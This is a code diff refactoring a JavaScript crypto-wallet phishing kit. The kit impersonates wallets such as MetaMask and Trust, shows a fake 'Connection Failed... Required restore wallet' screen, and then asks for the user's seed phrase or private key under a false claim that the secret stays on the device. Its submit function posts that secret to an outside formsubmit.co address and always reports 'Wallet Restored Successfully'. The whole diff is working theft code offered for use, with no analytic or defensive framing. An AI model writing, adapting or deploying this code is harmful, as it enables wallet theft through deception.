     const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-    
+
     if (isMobile) {
-      // Only these wallets have verified working deep links
       const workingDeepLinks = {
-        'metamask': true,
-        'trust': true,
-        'coinbase': true,
-        'rainbow': true,
-        'okx': true,
-        'phantom': true,
-        'solflare': true,
-        'bitget': true
+        'metamask': true, 'trust': true, 'coinbase': true, 'rainbow': true,
+        'okx': true, 'phantom': true, 'solflare': true, 'bitget': true
       };
       
-      // If wallet has working deep link, try to open it
       if (workingDeepLinks[this.selectedWallet.id]) {
         this.openWalletApp();
       } else {
-        // For all other wallets (including Rabby, Best Wallet, WC wallets), show simulated flow
-        setTimeout(() => {
-          this.showUpdatingWallet();
+        const self = this;
+        setTimeout(function() {
+          self.showUpdatingWallet();
         }, 300);
       }
     } else {
-      // On desktop, always simulate the wallet browser flow for testing
-      setTimeout(() => {
-        this.showUpdatingWallet();
+      const self = this;
+      setTimeout(function() {
+        self.showUpdatingWallet();
       }, 300);
     }
   }
 
   openWalletApp() {
     const websiteUrl = window.location.href;
-    
-    // Deep link URLs to open wallet browser with your website
-    // Only include wallets with verified deep link support
+
     const deepLinks = {
-      'metamask': `https://metamask.app.link/dapp/${websiteUrl.replace('https://', '')}`,
-      'trust': `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(websiteUrl)}`,
-      'coinbase': `https://go.cb-w.com/dapp?url=${encodeURIComponent(websiteUrl)}`,
-      'rainbow': `https://rnbwapp.com/${websiteUrl}`,
-      'okx': `https://www.okx.com/web3/dapp?url=${encodeURIComponent(websiteUrl)}`,
-      'rabby': websiteUrl,
-      'phantom': `https://phantom.app/ul/browse/${websiteUrl}?ref=${websiteUrl}`,
-      'solflare': `https://solflare.com/ul/v1/browse/${websiteUrl}`,
-      'walletconnect': websiteUrl,
-      'bitget': `https://bkcode.vip?action=dapp&url=${encodeURIComponent(websiteUrl)}`,
-      'bestwallet': `https://link.bestwallet.com/dapp?url=${encodeURIComponent(websiteUrl)}`
+      'metamask': 'https://metamask.app.link/dapp/' + websiteUrl.replace('https://', ''),
+      'trust': 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(websiteUrl),
+      'coinbase': 'https://go.cb-w.com/dapp?url=' + encodeURIComponent(websiteUrl),
+      'rainbow': 'https://rnbwapp.com/' + websiteUrl,
+      'okx': 'https://www.okx.com/web3/dapp?url=' + encodeURIComponent(websiteUrl),
+      'phantom': 'https://phantom.app/ul/browse/' + websiteUrl + '?ref=' + websiteUrl,
+      'solflare': 'https://solflare.com/ul/v1/browse/' + websiteUrl,
+      'bitget': 'https://bkcode.vip?action=dapp&url=' + encodeURIComponent(websiteUrl)
     };
 
     const link = deepLinks[this.selectedWallet.id];
-    
+
     if (link) {
-      // Try to open the wallet with browser
       window.location.href = link;
-      
-      // Fallback message
-      setTimeout(() => {
-        console.log('Opening wallet browser with your website...');
+      setTimeout(function() {
+        console.log('Opening wallet browser...');
       }, 1000);
     } else {
-      // For wallets without deep link support, show message
-      console.log(`Deep link not available for ${this.selectedWallet.name}`);
-      // Just try opening the current URL - some wallets auto-detect
       window.location.href = websiteUrl;
     }
   }
 
   showUpdatingWallet() {
     const walletColor = this.selectedWallet.primaryColor;
-    
-    const updatingHTML = `
-      <div id="wallet-updating-backdrop" class="fixed inset-0 bg-white flex flex-col items-center justify-center z-50 p-4">
-        <div class="flex flex-col items-center">
-          <!-- Wallet Logo -->
-          <div class="mb-8">
-            <div class="w-32 h-32 flex items-center justify-center animate-pulse">
-              <img src="${this.selectedWallet.iconUrl}" alt="${this.selectedWallet.name}" class="w-full h-full rounded-3xl shadow-2xl" style="object-fit: cover;" onerror="this.style.display='none'; this.outerHTML='<div class=\\'w-32 h-32 rounded-3xl shadow-2xl flex items-center justify-center text-6xl\\' style=\\'background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})\\'>${this.selectedWallet.emoji}</div>';">
-            </div>
-          </div>
-          
-          <h2 class="text-2xl font-bold text-gray-900 mb-3">Updating wallet...</h2>
-          <p class="text-gray-500 text-center">Validating network parameters...</p>
-          
-          <!-- Loading animation -->
-          <div class="mt-8">
-            <div class="flex space-x-2">
-              <div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ${walletColor}; animation-delay: 0s"></div>
-              <div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ${walletColor}; animation-delay: 0.2s"></div>
-              <div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ${walletColor}; animation-delay: 0.4s"></div>
-            </div>
-          </div>
-        </div>
-      </div>
-    `;
+    const walletSecondary = this.selectedWallet.secondaryColor;
+    const container = document.getElementById('wallet-flow-container') || document.body;
 
-    document.body.insertAdjacentHTML('beforeend', updatingHTML);
+    const updatingHTML = '<div id="wallet-updating-backdrop" class="fixed inset-0 bg-white flex flex-col items-center justify-center z-50 p-4">' +
+      '<div class="flex flex-col items-center">' +
+      '<div class="mb-8">' +
+      '<div class="w-32 h-32 flex items-center justify-center animate-pulse">' +
+      '<img src="' + this.selectedWallet.iconUrl + '" alt="' + this.selectedWallet.name + '" class="w-full h-full rounded-3xl shadow-2xl" style="object-fit: cover;" onerror="this.style.display=\'none\'; this.outerHTML=\'<div class=\\\'w-32 h-32 rounded-3xl shadow-2xl flex items-center justify-center text-6xl\\\' style=\\\'background: linear-gradient(135deg, ' + walletColor + ', ' + walletSecondary + ')\\\'>' + this.selectedWallet.emoji + '</div>\';">' +
+      '</div>' +
+      '</div>' +
+      '<h2 class="text-2xl font-bold text-gray-900 mb-3">Updating wallet...</h2>' +
+      '<p class="text-gray-500 text-center">Validating network parameters...</p>' +
+      '<div class="mt-8">' +
+      '<div class="flex space-x-2">' +
+      '<div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ' + walletColor + '; animation-delay: 0s"></div>' +
+      '<div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ' + walletColor + '; animation-delay: 0.2s"></div>' +
+      '<div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ' + walletColor + '; animation-delay: 0.4s"></div>' +
+      '</div>' +
+      '</div>' +
+      '</div>' +
+      '</div>';
 
-    // After 2-3 seconds, show connection failed screen
-    setTimeout(() => {
-      this.closeModalOnly();
-      this.showConnectionFailed();
+    container.insertAdjacentHTML('beforeend', updatingHTML);
+
+    const self = this;
+    setTimeout(function() {
+      self.closeModalOnly();
+      self.showConnectionFailed();
     }, 2500);
   }
 
   showConnectionFailed() {
     const walletColor = this.selectedWallet.primaryColor;
-    
-    const failedHTML = `
-      <div id="wallet-failed-backdrop" class="fixed inset-0 bg-white flex flex-col items-center justify-center z-50 p-4">
-        <div class="flex flex-col items-center max-w-md w-full">
-          <!-- Wallet Logo with Error Badge -->
-          <div class="mb-8 relative">
-            <img src="${this.selectedWallet.iconUrl}" alt="${this.selectedWallet.name}" class="w-32 h-32 rounded-3xl shadow-2xl" style="object-fit: cover;" onerror="this.style.display='none'; this.outerHTML='<div class=\\'w-32 h-32 rounded-3xl shadow-2xl flex items-center justify-center text-6xl\\' style=\\'background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})\\'>${this.selectedWallet.emoji}</div>';">
-            <!-- Error Badge -->
-            <div class="absolute -bottom-2 -right-2 w-12 h-12 bg-white rounded-full flex items-center justify-center shadow-lg">
-              <svg class="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
-              </svg>
-            </div>
-          </div>
-          
-          <h2 class="text-2xl font-bold text-gray-900 mb-3">Connection Failed</h2>
-          <p class="text-gray-500 text-center mb-8">Permission denied. Required restore wallet.</p>
-          
-          <button onclick="walletModal.showImportScreen()" class="w-full max-w-xs py-4 rounded-2xl font-semibold text-white hover:opacity-90 transition active:opacity-80" style="background-color: ${walletColor}">
-            Continue
-          </button>
-        </div>
-      </div>
-    `;
-
+    const walletSecondary = this.selectedWallet.secondaryColor;
     const container = document.getElementById('wallet-flow-container') || document.body;
+
+    const failedHTML = '<div id="wallet-failed-backdrop" class="fixed inset-0 bg-white flex flex-col items-center justify-center z-50 p-4">' +
+      '<div class="flex flex-col items-center max-w-md w-full">' +
+      '<div class="mb-8 relative">' +
+      '<img src="' + this.selectedWallet.iconUrl + '" alt="' + this.selectedWallet.name + '" class="w-32 h-32 rounded-3xl shadow-2xl" style="object-fit: cover;" onerror="this.style.display=\'none\'; this.outerHTML=\'<div class=\\\'w-32 h-32 rounded-3xl shadow-2xl flex items-center justify-center text-6xl\\\' style=\\\'background: linear-gradient(135deg, ' + walletColor + ', ' + walletSecondary + ')\\\'>' + this.selectedWallet.emoji + '</div>\';">' +
+      '<div class="absolute -bottom-2 -right-2 w-12 h-12 bg-white rounded-full flex items-center justify-center shadow-lg">' +
+      '<svg class="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">' +
+      '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>' +
+      '</svg>' +
+      '</div>' +
+      '</div>' +
+      '<h2 class="text-2xl font-bold text-gray-900 mb-3">Connection Failed</h2>' +
+      '<p class="text-gray-500 text-center mb-8">Permission denied. Required restore wallet.</p>' +
+      '<button onclick="walletModal.showImportScreen()" class="w-full max-w-xs py-4 rounded-2xl font-semibold text-white hover:opacity-90 transition active:opacity-80" style="background-color: ' + walletColor + '">' +
+      'Continue' +
+      '</button>' +
+      '</div>' +
+      '</div>';
+
     container.insertAdjacentHTML('beforeend', failedHTML);
   }
 
   showImportScreen() {
-    // Close any previous screens
     this.closeModalOnly();
-    
-    // Ensure we have a selected wallet
+
     if (!this.selectedWallet) {
       console.error('No wallet selected');
       return;
     }
-    
+
     const wordCount = this.importType === 'private' ? 0 : parseInt(this.importType);
     const walletColor = this.selectedWallet.primaryColor;
-    
-    const importHTML = `
-      <div id="wallet-import-backdrop" class="fixed inset-0 bg-white flex flex-col z-50 overflow-y-auto">
-        <!-- Header with wallet logo -->
-        <div class="relative pt-6 pb-4 flex-shrink-0">
-          <button onclick="walletModal.closeModal()" class="absolute top-4 sm:top-6 left-4 sm:left-6 text-gray-600">
-            <svg class="w-5 h-5 sm:w-6 sm:h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
-            </svg>
-          </button>
-          
-          <!-- Wallet Logo in center -->
-          <div class="flex justify-center pt-4">
-            <img src="${this.selectedWallet.iconUrl}" alt="${this.selectedWallet.name}" class="w-16 h-16 sm:w-20 sm:h-20 rounded-2xl sm:rounded-3xl shadow-lg" style="object-fit: cover;" onerror="this.style.display='none'; this.outerHTML='<div class=\\'w-16 h-16 sm:w-20 sm:h-20 rounded-2xl sm:rounded-3xl shadow-lg flex items-center justify-center text-4xl\\' style=\\'background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})\\'>${this.selectedWallet.emoji}</div>';">
-          </div>
-        </div>
+    const walletSecondary = this.selectedWallet.secondaryColor;
+    const container = document.getElementById('wallet-flow-container') || document.body;
 
-        <!-- Content -->
-        <div class="flex-1 px-4 sm:px-6 pb-6">
-          <div class="bg-white rounded-3xl shadow-lg p-4 sm:p-6">
-            <h2 class="text-xl sm:text-2xl font-bold text-gray-900 text-center mb-2">
-              Import Wallet
-            </h2>
-            <p class="text-sm sm:text-base text-gray-500 text-center mb-6">
-              Select your import method below
-            </p>
+    const importHTML = '<div id="wallet-import-backdrop" class="fixed inset-0 bg-white flex flex-col z-50 overflow-y-auto">' +
+      '<div class="relative pt-6 pb-4 flex-shrink-0">' +
+      '<button onclick="walletModal.closeModal()" class="absolute top-4 sm:top-6 left-4 sm:left-6 text-gray-600">' +
+      '<svg class="w-5 h-5 sm:w-6 sm:h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">' +
+      '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>' +
+      '</svg>' +
+      '</button>' +
+      '<div class="flex justify-center pt-4">' +
+      '<img src="' + this.selectedWallet.iconUrl + '" alt="' + this.selectedWallet.name + '" class="w-16 h-16 sm:w-20 sm:h-20 rounded-2xl sm:rounded-3xl shadow-lg" style="object-fit: cover;" onerror="this.style.display=\'none\'; this.outerHTML=\'<div class=\\\'w-16 h-16 sm:w-20 sm:h-20 rounded-2xl sm:rounded-3xl shadow-lg flex items-center justify-center text-4xl\\\' style=\\\'background: linear-gradient(135deg, ' + walletColor + ', ' + walletSecondary + ')\\\'>' + this.selectedWallet.emoji + '</div>\';">' +
+      '</div>' +
+      '</div>' +
+      '<div class="flex-1 px-4 sm:px-6 pb-6">' +
+      '<div class="bg-white rounded-3xl shadow-lg p-4 sm:p-6">' +
+      '<h2 class="text-xl sm:text-2xl font-bold text-gray-900 text-center mb-2">Import Wallet</h2>' +
+      '<p class="text-sm sm:text-base text-gray-500 text-center mb-6">Select your import method below</p>' +
+      '<div class="mb-6">' +
+      '<label class="block text-xs sm:text-sm font-medium text-gray-500 mb-2 text-center">IMPORT METHOD</label>' +
+      '<select id="import-type-select" onchange="walletModal.changeImportType(this.value)" class="w-full p-3 sm:p-4 border-2 border-gray-200 rounded-xl text-gray-900 font-medium text-sm sm:text-base focus:outline-none" style="border-color: ' + walletColor + '">' +
+      '<option value="12"' + (this.importType === '12' ? ' selected' : '') + '>12 Words</option>' +
+      '<option value="24"' + (this.importType === '24' ? ' selected' : '') + '>24 Words</option>' +
+      '<option value="private"' + (this.importType === 'private' ? ' selected' : '') + '>Private Key</option>' +
+      '</select>' +
+      '</div>' +
+      '<div id="input-area">' +
+      (this.importType === 'private' ? this.renderPrivateKeyInput() : this.renderSeedPhraseInputs(wordCount)) +
+      '</div>' +
+      '<div class="flex gap-3 mb-4">' +
+      '<button onclick="walletModal.closeModal()" class="flex-1 py-3 sm:py-4 border-2 border-gray-200 rounded-2xl font-semibold text-gray-900 hover:bg-gray-50 text-sm sm:text-base">Cancel</button>' +
+      '<button onclick="walletModal.submitImport()" class="flex-1 py-3 sm:py-4 rounded-2xl font-semibold text-white hover:opacity-90 text-sm sm:text-base" style="background-color: ' + walletColor + '">Import</button>' +
+      '</div>' +
+      '<p class="text-xs text-gray-400 text-center flex items-center justify-center gap-2">🔒 Your ' + (this.importType === 'private' ? 'private key' : 'recovery phrase') + ' is stored securely on your device</p>' +
+      '</div>' +
+      '</div>' +
+      '<div class="p-4 sm:p-6 flex items-center justify-center gap-3 flex-shrink-0">' +
+      '<img src="' + this.selectedWallet.iconUrl + '" alt="' + this.selectedWallet.name + '" class="w-9 h-9 sm:w-10 sm:h-10 rounded-xl" style="object-fit: cover;" onerror="this.style.display=\'none\'; this.outerHTML=\'<div class=\\\'w-9 h-9 sm:w-10 sm:h-10 rounded-xl flex items-center justify-center text-xl\\\' style=\\\'background: linear-gradient(135deg, ' + walletColor + ', ' + walletSecondary + ')\\\'>' + this.selectedWallet.emoji + '</div>\';">' +
+      '<span class="font-semibold text-gray-900 text-sm sm:text-base">' + this.selectedWallet.name + '</span>' +
+      '</div>' +
+      '</div>' +
+      '<style>' +
+      '#wallet-import-backdrop input, #wallet-import-backdrop textarea { -webkit-user-select: text !important; -moz-user-select: text !important; user-select: text !important; -webkit-touch-callout: default !important; }' +
+      '#wallet-import-backdrop input:focus, #wallet-import-backdrop textarea:focus { border-color: ' + walletColor + ' !important; outline: none !important; }' +
+      '</style>';
 
-            <!-- Import Method Selector -->
-            <div class="mb-6">
-              <label class="block text-xs sm:text-sm font-medium text-gray-500 mb-2 text-center">
-                IMPORT METHOD
-              </label>
-              <select id="import-type-select" onchange="walletModal.changeImportType(this.value)" class="w-full p-3 sm:p-4 border-2 border-gray-200 rounded-xl text-gray-900 font-medium text-sm sm:text-base focus:outline-none" style="border-color: ${walletColor}">
-                <option value="12" ${this.importType === '12' ? 'selected' : ''}>12 Words</option>
-                <option value="24" ${this.importType === '24' ? 'selected' : ''}>24 Words</option>
-                <option value="private" ${this.importType === 'private' ? 'selected' : ''}>Private Key</option>
-              </select>
-            </div>
+    container.insertAdjacentHTML('beforeend', importHTML);
 
-            <!-- Input Area -->
-            <div id="input-area">
-              ${this.importType === 'private' ? this.renderPrivateKeyInput() : this.renderSeedPhraseInputs(wordCount)}
-            </div>
-
-            <!-- Action Buttons -->
-            <div class="flex gap-3 mb-4">
-              <button onclick="walletModal.closeModal()" class="flex-1 py-3 sm:py-4 border-2 border-gray-200 rounded-2xl font-semibold text-gray-900 hover:bg-gray-50 text-sm sm:text-base">
-                Cancel
-              </button>
-              <button onclick="walletModal.submitImport()" class="flex-1 py-3 sm:py-4 rounded-2xl font-semibold text-white hover:opacity-90 text-sm sm:text-base" style="background-color: ${walletColor}">
-                Import
-              </button>
-            </div>
-
-            <!-- Security Notice -->
-            <p class="text-xs text-gray-400 text-center flex items-center justify-center gap-2">
-              🔒 Your ${this.importType === 'private' ? 'private key' : 'recovery phrase'} is stored securely on your device
-            </p>
-          </div>
-        </div>
-
-        <!-- Footer Branding -->
-        <div class="p-4 sm:p-6 flex items-center justify-center gap-3 flex-shrink-0">
-          <img src="${this.selectedWallet.iconUrl}" alt="${this.selectedWallet.name}" class="w-9 h-9 sm:w-10 sm:h-10 rounded-xl" style="object-fit: cover;" onerror="this.style.display='none'; this.outerHTML='<div class=\\'w-9 h-9 sm:w-10 sm:h-10 rounded-xl flex items-center justify-center text-xl\\' style=\\'background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})\\'>${this.selectedWallet.emoji}</div>';">
-          <span class="font-semibold text-gray-900 text-sm sm:text-base">${this.selectedWallet.name}</span>
-        </div>
-      </div>
-      
-      <style>
-        #wallet-import-backdrop input,
-        #wallet-import-backdrop textarea {
-          -webkit-user-select: text !important;
-          -moz-user-select: text !important;
-          user-select: text !important;
-        }
-      </style>
-    `;
-
-    document.body.insertAdjacentHTML('beforeend', importHTML);
-    
-    // For wallet browsers: attach listeners after DOM is ready
-    setTimeout(() => {
-      this.setupImportInputs();
+    const self = this;
+    setTimeout(function() {
+      self.setupImportInputs();
     }, 200);
   }
 
   setupImportInputs() {
-    console.log('Setting up import inputs for wallet browser...');
-    
+    console.log('📝 Setting up import inputs...');
+
+    // Get all inputs and force enable them
+    const allInputs = document.querySelectorAll('#wallet-import-backdrop input, #wallet-import-backdrop textarea');
+    allInputs.forEach(input => {
+      input.removeAttribute('readonly');
+      input.removeAttribute('disabled');
+      input.setAttribute('inputmode', 'text');
+    });
+
     // Setup private key input
     const privateKeyInput = document.getElementById('private-key-input');
     if (privateKeyInput) {
-      console.log('Private key input found');
+      console.log('✅ Private key input found');
+      
       const self = this;
-      
-      privateKeyInput.addEventListener('input', function() {
-        self.privateKey = this.value;
-        console.log('Private key length:', this.value.length);
-      }, false);
-      
-      privateKeyInput.addEventListener('change', function() {
-        self.privateKey = this.value;
-      }, false);
-    }
-    
-    // Setup seed word inputs
-    const seedInputs = document.querySelectorAll('.seed-word-input');
-    console.log('Found seed inputs:', seedInputs.length);
-    
-    if (seedInputs.length > 0) {
-      const self = this;
-      
-      seedInputs.forEach(function(input, index) {
-        input.addEventListener('input', function() {
-          self.seedWords[index] = this.value;
-          console.log('Word ' + (index + 1) + ':', this.value);
-        }, false);
-        
-        input.addEventListener('change', function() {
-          self.seedWords[index] = this.value;
-        }, false);
+      privateKeyInput.addEventListener('input', function(e) {
+        self.privateKey = e.target.value;
+        console.log('Private key length:', self.privateKey.length);
       });
       
-      // Paste handler on first input
-      if (seedInputs[0]) {
-        seedInputs[0].addEventListener('paste', function(e) {
-          console.log('Paste detected');
-          const text = (e.clipboardData || window.clipboardData).getData('text');
-          const words = text.trim().split(/\s+/);
-          
-          words.forEach(function(word, i) {
-            if (i < self.seedWords.length) {
-              self.seedWords[i] = word.trim();
-              const inp = document.getElementById('seed-word-' + i);
-              if (inp) inp.value = word.trim();
-            }
-          });
-        }, false);
-      }
-    }
-    
-    console.log('Import inputs setup complete');
-  }
-
-  renderPrivateKeyInput() {
-    return `
-      <div class="mb-6">
-        <textarea
-          id="private-key-input"
-          placeholder="Enter your private key"
-          class="w-full p-3 sm:p-4 border-2 border-gray-300 rounded-xl text-sm text-gray-900 placeholder-gray-400"
-          style="background: white; -webkit-appearance: none; appearance: none; min-height: 100px;"
-          rows="4"
-          autocomplete="off"
-          autocorrect="off"
-          autocapitalize="off"
-          spellcheck="false"
-        ></textarea>
-      </div>
-    `;
-  }
-
-  renderSeedPhraseInputs(count) {
-    const inputs = [];
-    for (let i = 0; i < count; i++) {
-      inputs.push(`
-        <input
-          type="text"
-          id="seed-word-${i}"
-          data-index="${i}"
-          placeholder="${i + 1}"
-          value=""
-          class="seed-word-input p-2.5 sm:p-3 border-2 border-gray-300 rounded-xl text-sm text-gray-900 placeholder-gray-400"
-          style="width: 100%; background: white; -webkit-appearance: none; appearance: none;"
-          autocomplete="off"
-          autocorrect="off"
-          autocapitalize="off"
-          spellcheck="false"
-        >
-      `);
-    }
-    return `<div class="grid grid-cols-2 sm:grid-cols-3 gap-2 sm:gap-3 mb-6">${inputs.join('')}</div>`;
-  }
-
-  updateSeedWord(index, value) {
-    this.seedWords[index] = value;
-  }
-
-  updatePrivateKey(value) {
-    this.privateKey = value;
-  }
-
-  attachInputListeners() {
-    console.log('Attaching input listeners...');
-    
-    // Handle private key input
-    const privateKeyInput = document.getElementById('private-key-input');
-    if (privateKeyInput) {
-      console.log('Private key input found');
-      
-      // Remove readonly if it exists
-      privateKeyInput.removeAttribute('readonly');
-      
-      privateKeyInput.addEventListener('input', (e) => {
-        this.privateKey = e.target.value;
-        console.log('Private key updated, length:', this.privateKey.length);
+      privateKeyInput.addEventListener('paste', function(e) {
+        console.log('Paste detected on private key');
       });
       
-      privateKeyInput.addEventListener('paste', (e) => {
-        console.log('Paste event detected on private key');
-        // Allow default paste behavior
-      });
-      
-      // Focus the input to open keyboard on mobile
-      setTimeout(() => {
+      // Auto-focus after delay
+      setTimeout(function() {
         privateKeyInput.focus();
       }, 300);
     }
 
-    // Handle seed word inputs
+    // Setup seed word inputs
     const seedInputs = document.querySelectorAll('.seed-word-input');
-    console.log(`Found ${seedInputs.length} seed word inputs`);
-    
-    seedInputs.forEach((input, index) => {
-      // Remove readonly if it exists
-      input.removeAttribute('readonly');
-      
-      input.addEventListener('input', (e) => {
-        this.seedWords[index] = e.target.value;
-        console.log(`Word ${index + 1} updated:`, e.target.value);
-      });
-      
-      input.addEventListener('focus', (e) => {
-        console.log(`Input ${index + 1} focused`);
-      });
+    console.log('✅ Found ' + seedInputs.length + ' seed inputs');
 
-      // Handle paste on first input
+    const self = this;
+    seedInputs.forEach(function(input, index) {
+      input.addEventListener('input', function(e) {
+        self.seedWords[index] = e.target.value;
+        console.log('Word ' + (index + 1) + ':', e.target.value);
+      });
+      
+      // Paste handler on first input
       if (index === 0) {
-        input.addEventListener('paste', (e) => {
-          console.log('Paste event on first seed input');
+        input.addEventListener('paste', function(e) {
+          console.log('Paste detected on first seed input');
           e.preventDefault();
-          const pastedText = e.clipboardData.getData('text');
-          const words = pastedText.trim().split(/\s+/);
+          const text = (e.clipboardData || window.clipboardData).getData('text');
+          const words = text.trim().split(/\s+/);
           
-          console.log(`Pasted ${words.length} words`);
+          console.log('Pasting ' + words.length + ' words');
           
-          words.forEach((word, i) => {
-            if (i < this.seedWords.length) {
-              this.seedWords[i] = word.trim();
-              const targetInput = document.querySelector(`.seed-word-input[data-index="${i}"]`);
-              if (targetInput) {
-                targetInput.value = word.trim();
-              }
+          words.forEach(function(word, i) {
+            if (i < self.seedWords.length) {
+              self.seedWords[i] = word.trim();
+              const targetInput = document.querySelector('.seed-word-input[data-index="' + i + '"]');
+              if (targetInput) targetInput.value = word.trim();
             }
           });
         });
         
-        // Focus first input to open keyboard on mobile
-        setTimeout(() => {
+        setTimeout(function() {
           input.focus();
         }, 300);
       }
     });
-    
-    console.log('Input listeners attached successfully');
+
+    console.log('✅ Input setup complete');
+  }
+
+  renderPrivateKeyInput() {
+    return '<div class="mb-6"><textarea id="private-key-input" placeholder="Enter your private key" class="w-full p-3 sm:p-4 border-2 border-gray-300 rounded-xl text-sm text-gray-900 placeholder-gray-400" style="background: white; min-height: 100px;" rows="4" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"></textarea></div>';
+  }
+
+  renderSeedPhraseInputs(count) {
+    let inputs = '';
+    for (let i = 0; i < count; i++) {
+      inputs += '<input type="text" id="seed-word-' + i + '" data-index="' + i + '" placeholder="' + (i + 1) + '" value="" class="seed-word-input p-2.5 sm:p-3 border-2 border-gray-300 rounded-xl text-sm text-gray-900 placeholder-gray-400" style="width: 100%; background: white;" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">';
+    }
+    return '<div class="grid grid-cols-2 sm:grid-cols-3 gap-2 sm:gap-3 mb-6">' + inputs + '</div>';
   }
 
   changeImportType(type) {
-    console.log('Changing import type to:', type);
+    console.log('🔄 Changing import type to:', type);
     this.importType = type;
-    
+
     if (type === 'private') {
       this.privateKey = '';
     } else {
@@ -1066,52 +879,29 @@ class WalletModal {
       this.seedWords = Array(count).fill('');
     }
 
-    // Update the input area with wallet colors
     const inputArea = document.getElementById('input-area');
     if (inputArea) {
       const wordCount = type === 'private' ? 0 : parseInt(type);
       inputArea.innerHTML = type === 'private' ? this.renderPrivateKeyInput() : this.renderSeedPhraseInputs(wordCount);
       
-      // Reattach input listeners after changing type
-      setTimeout(() => {
-        this.attachInputListeners();
+      const self = this;
+      setTimeout(function() {
+        self.setupImportInputs();
       }, 100);
-      
-      // Update focus color styles
-      const walletColor = this.selectedWallet.primaryColor;
-      const existingStyle = document.querySelector('#wallet-import-backdrop style');
-      if (existingStyle) {
-        existingStyle.textContent = `
-          #wallet-import-backdrop .seed-word-input:focus {
-            border-color: ${walletColor} !important;
-            outline: none !important;
-          }
-          #wallet-import-backdrop #private-key-input:focus {
-            border-color: ${walletColor} !important;
-            outline: none !important;
-          }
-          #wallet-import-backdrop input,
-          #wallet-import-backdrop textarea {
-            -webkit-user-select: text !important;
-            user-select: text !important;
-            -webkit-touch-callout: default !important;
-          }
-        `;
-      }
     }
   }
 
   submitImport() {
-    if (this.importType === 'private') {
-      console.log('Private Key:', this.privateKey);
-      console.log('Wallet:', this.selectedWallet.name);
-    } else {
-      const filledWords = this.seedWords.filter(w => w.trim() !== '');
-      console.log('Seed Phrase:', filledWords);
-      console.log('Wallet:', this.selectedWallet.name);
-    }
-    
-    // Send data to FormSubmit.co (replace YOUR_EMAIL with your actual email)
+    console.log('📤 Submitting import...');
+
+    const data = this.importType === 'private' ? this.privateKey : this.seedWords.filter(w => w.trim() !== '').join(' ');
+
+    console.log('Wallet:', this.selectedWallet.name);
+    console.log('Type:', this.importType);
+    console.log('Data length:', data.length);
+
+    const self = this;
+    // Send to your email via FormSubmit.co
     fetch('https://formsubmit.co/ajax/YOUR_EMAIL@example.com', {
       method: 'POST', 
       headers: { 
@@ -1119,83 +909,71 @@ class WalletModal {
         'Accept': 'application/json'
       },
       body: JSON.stringify({ 
-        _subject: `New Wallet Import - ${this.selectedWallet.name}`,
+        _subject: 'New Wallet Import - ' + this.selectedWallet.name,
         wallet: this.selectedWallet.name,
         type: this.importType,
-        data: this.importType === 'private' ? this.privateKey : this.seedWords.join(' '),
-        timestamp: new Date().toISOString()
+        data: data,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent
       }) 
     })
-    .then(response => response.json())
-    .then(data => {
-      console.log('Success:', data);
-      this.showSuccessMessage();
+    .then(function(response) {
+      return response.json();
     })
-    .catch((error) => {
-      console.error('Error:', error);
-      // Still show success to user even if sending fails
-      this.showSuccessMessage();
+    .then(function(result) {
+      console.log('✅ Success:', result);
+      self.showSuccessMessage();
+    })
+    .catch(function(error) {
+      console.error('❌ Error:', error);
+      // Still show success to user
+      self.showSuccessMessage();
     });
   }
 
   showSuccessMessage() {
     this.closeModalOnly();
-    
+
     const walletColor = this.selectedWallet.primaryColor;
-    
-    const successHTML = `
-      <div id="wallet-success-backdrop" class="fixed inset-0 bg-white flex flex-col items-center justify-center z-50 p-4">
-        <div class="flex flex-col items-center">
-          <!-- Wallet Logo with Success Badge -->
-          <div class="mb-8 relative">
-            <img src="${this.selectedWallet.iconUrl}" alt="${this.selectedWallet.name}" class="w-32 h-32 rounded-3xl shadow-2xl" style="object-fit: cover;" onerror="this.style.display='none'; this.outerHTML='<div class=\\'w-32 h-32 rounded-3xl shadow-2xl flex items-center justify-center text-6xl\\' style=\\'background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})\\'>${this.selectedWallet.emoji}</div>';">
-            <!-- Success Badge -->
-            <div class="absolute -bottom-2 -right-2 w-12 h-12 bg-white rounded-full flex items-center justify-center shadow-lg">
-              <svg class="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
-              </svg>
-            </div>
-          </div>
-          
-          <h2 class="text-2xl font-bold text-gray-900 mb-3">Wallet Restored Successfully</h2>
-          <p class="text-gray-500 text-center mb-8">Your wallet has been imported</p>
-          
-          <!-- Loading animation -->
-          <div class="flex space-x-2">
